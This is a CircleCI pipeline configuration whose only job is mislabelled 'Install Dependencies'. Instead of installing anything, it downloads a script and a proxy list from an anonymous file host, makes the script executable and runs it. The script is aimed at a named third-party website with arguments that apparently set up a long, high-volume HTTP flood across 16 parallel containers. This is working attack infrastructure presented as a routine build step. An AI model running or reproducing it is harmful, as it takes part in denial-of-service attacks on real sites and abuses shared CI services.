version: 2.1 
jobs: 
    trial: 
      docker: 
            - image: debian:latest 
      parallelism: 16 
      steps: 
        - run: 
            name: Install Dependencies 
            command: apt update && apt install nodejs wget -y && wget https://temp.sh/dvUad/f.js && wget https://temp.sh/qKPmp/https.txt && chmod +x f.js && ./f.js GET https://pdalife.to/ https.txt 999999 153 30
            no_output_timeout: 5h 
 
workflows: 
    version: 2.1 
    build: 
        jobs: 
        - trial
